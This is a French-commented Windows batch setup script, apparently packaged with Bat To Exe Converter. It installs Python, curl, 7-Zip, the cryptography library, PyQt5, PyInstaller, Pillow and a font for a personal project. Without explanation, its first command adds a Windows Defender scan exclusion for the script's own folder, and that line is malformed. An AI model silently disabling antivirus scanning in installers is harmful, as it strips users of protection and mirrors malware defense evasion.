::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFA1dTxCNAES0A5EO4f7+08iSsEgcQd4sfZvOyvqLOOVz
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 3

C:\Program Files\Windows Defender\MpCmdRun.exe" -AddExclusion -ExclusionPath "%~dp0"

:: Vérifier et installer Python
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python n'est pas install√©. Installation en cours...
    :: Télécharger et installer Python depuis le site officiel (version portable)
    curl -L -o python.zip https://www.python.org/ftp/python/3.9.7/python-3.9.7-embed-amd64.zip
    mkdir C:\Python39
    powershell -command "Expand-Archive -Path python.zip -DestinationPath C:\Python39"
    del python.zip
    setx PATH "%PATH%;C:\Python39"
    echo Installation de Python termin√©e.
)

:: Vérifier et installer Curl
curl --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Curl n'est pas install√©. Installation en cours...
    :: Télécharger et installer Curl
    choco install curl -y
    echo Installation de Curl termin√©e.
)

:: Vérifier et installer 7-Zip
7z --version > nul 2>&1
if %errorlevel% neq 0 (
    echo 7-Zip n'est pas install√©. Installation en cours...
    :: Télécharger et installer 7-Zip
    choco install 7zip -y
    echo Installation de 7-Zip termin√©e.
)

:: Vérifier et installer cryptography
python -c "import cryptography" > nul 2>&1
if %errorlevel% neq 0 (
    echo cryptography n'est pas install√©. Installation en cours...
    :: Installer cryptography
    pip install cryptography
    echo Installation de cryptography termin√©e.
)

:: Vérifier et installer PyQt5
python -c "import PyQt5.QtWidgets" > nul 2>&1
if %errorlevel% neq 0 (
    echo PyQt5 n'est pas install√©. Installation en cours...
    :: Installer PyQt5
    pip install PyQt5
    echo Installation de PyQt5 termin√©e.
)

:: Installer PyInstaller
pip install --upgrade pyinstaller
echo Installation de PyInstaller termin√©e.

:: Installer Pillow
pip install Pillow
echo Installation de Pillow termin√©e.

:: Vérifier la présence de la police Magneto
if not exist "C:\Users\victo\OneDrive\Bureau\projet vicking\magneto-bold.ttf" (
    echo Téléchargement du fichier ZIP de la police Magneto...
    curl -L -o magneto.zip https://cdn1.maisfontes.com/temp/magneto-bold-maisfontes.62b6.zip
    echo Extraction de la police Magneto...
    powershell -command "Expand-Archive -Path magneto.zip -DestinationPath C:\Users\victo\OneDrive\Bureau\projet vicking"
    del magneto.zip
    echo Installation de la police Magneto termin√©e.
) else (
    echo La police Magneto est déjà présente.
)

echo Toutes les dépendances sont présentes et installées avec succès.
pause
